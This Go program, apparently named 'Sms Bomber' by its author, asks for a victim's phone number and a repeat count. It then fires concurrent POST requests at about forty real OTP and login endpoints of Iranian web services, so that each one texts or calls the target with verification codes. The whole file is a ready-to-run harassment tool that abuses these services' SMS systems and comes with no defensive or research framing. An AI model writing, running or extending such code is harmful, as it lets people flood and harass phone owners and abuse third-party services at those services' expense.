package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"    
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود

	const maxRetries = 3             // حداکثر تعداد تلاش مجدد
	const retryDelay = 2 * time.Second // فاصله زمانی بین تلاش‌های مجدد

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 // سیگنال لغو
			return
		default:
			// ادامه اجرای حلقه اگر Context لغو نشده باشد
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue // برو به تلاش بعدی
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue // برو به تلاش بعدی
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			// بررسی نوع خطا برای تلاش مجدد
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError // یا شاید کد خطای دیگری برای خطاهای شبکه
					return
				}
				time.Sleep(retryDelay)
				continue // برو به تلاش بعدی
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 // سیگنال لغو
				return
			} else {
				// خطای غیرمنتظره یا غیرمرتبط با شبکه که نباید تلاش مجدد شود
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// اگر درخواست موفق بود (بدون خطا در ارسال)، وضعیت را میفرستیم و خارج میشویم
		ch <- resp.StatusCode
		resp.Body.Close() // بستن بدنه پاسخ پس از استفاده
		return // درخواست موفق بود، نیازی به تلاش مجدد نیست
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود

	const maxRetries = 3             // حداکثر تعداد تلاش مجدد
	const retryDelay = 3 * time.Second // فاصله زمانی بین تلاش‌های مجدد

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 // سیگنال لغو
			return
		default:
			// ادامه اجرای حلقه اگر Context لغو نشده باشد
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError 
					return
				}
				time.Sleep(retryDelay)
				continue 
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close() 
		return 
	}
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")

	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel() 
	}()

	tasks := make(chan func(), repeatCount*40) 


	numWorkers := 20

	var wg sync.WaitGroup
	ch := make(chan int, repeatCount*40) 

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task() 
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {
		
              



		wg.Add(1) // virgool.io (JSON) 
		tasks <- func() {
			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
				"identifier": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digistyle.com (Form)
		tasks <- func() {
			formData := url.Values{}
			// کلید 'loginRegister%5Bemail_phone%5D' decode میشود به 'loginRegister[email_phone]'
			formData.Set("loginRegister[email_phone]", phone)
			sendFormRequest(ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch)
		}
		wg.Add(1) // sandbox.sibbazar.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://sandbox.sibbazar.com/api/v1/user/generator-inv-token", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // core.gapfilm.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
				"PhoneNo": phone,
			}, &wg, ch)
		}
		wg.Add(1) // api.pindo.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // divar.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // shab.ir login-otp (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // shab.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
				"mobile":       phone,
				"country_code": "+98",
			}, &wg, ch)
		}
		wg.Add(1) // Mobinnet (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch)
		}
		wg.Add(1) // api.ostadkr.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.ostadkr.com/login", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digikalajet.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // iranicard.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // alopeyk.com (JSON) - sms
		tasks <- func() {
			sendJSONRequest(ctx, "https://alopeyk.com/api/sms/send.php", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // alopeyk.com (JSON) - login
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // pinket.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}
		wg.Add(1) // otaghak.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // banimode.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // gw.jabama.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // jabama.com (JSON) - taraazws
		tasks <- func() {
			sendJSONRequest(ctx, "https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // torobpay.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.torobpay.com/user/v1/login/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}
		wg.Add(1) // sheypoor.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // miare.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}
		wg.Add(1) // pezeshket.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
				"mobileNumber": phone,
			}, &wg, ch)
		}
		wg.Add(1) // classino.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // snapp.taxi (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // api.snapp.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // snapp.market(JSON)
		tasks <- func() {
			sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digikala.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // ponisha.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // bitycle.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // barghman (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // komodaa.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}
		wg.Add(1) // anargift.com auth (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // anargift.com (JSON) - send_code
		tasks <- func() {
			sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digitalsignup.snapp.ir (URL query)
		tasks <- func() {
			sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digitalsignup.snapp.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // Snappfood (Form)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("cellphone", phone)
			sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
		}
		wg.Add(1) // khodro45.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
				"mobile": phone,
				"device_type": 2,
			}, &wg, ch)
		}
		wg.Add(1) // irantic.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // basalam.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // drnext.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digikalajet.ir (JSON) - تکراری در لیست قبلی
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // caropex.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // tetherland.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // tandori.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.tandori.ir/client/users/login", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
	}

	
	close(tasks)


	go func() {
		wg.Wait()
		close(ch)
	}()

	// پردازش کدهای وضعیت دریافت شده از کانال ch
	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 { // کد وضعیت 0 برای درخواست های لغو شده توسط Context
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
